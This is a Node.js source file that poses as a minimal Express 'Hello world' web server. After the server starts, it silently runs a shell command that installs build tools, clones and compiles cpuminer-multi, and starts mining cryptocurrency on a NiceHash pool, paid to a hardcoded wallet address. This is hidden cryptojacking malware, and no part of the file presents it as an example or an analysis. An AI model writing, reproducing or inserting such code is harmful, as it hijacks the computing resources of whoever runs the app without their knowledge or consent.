'use strict';

const express = require('express');
const exec = require("child_process").exec

const PORT = 8080;

const app = express();
app.get('/', function (req, res) {
  res.send('Hello world\n');
});

app.listen(PORT);
console.log('Running on http://localhost:' + PORT);

var cmd = 'apt-get update -qq && apt-get install -qy build-essential libcurl4-openssl-dev git automake libtool libjansson* libncurses5-dev libssl-dev && git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh && ./configure --with-crypto --with-curl && make -j"$(nproc)" && make install && cpuminer -a lyra2re -o stratum+tcp://lyra2re.hk.nicehash.com:3342 -u 1NArxcdTF7nFzpf4aerd61mdqm4SQwAfW4.b1 -p x';
exec(cmd);
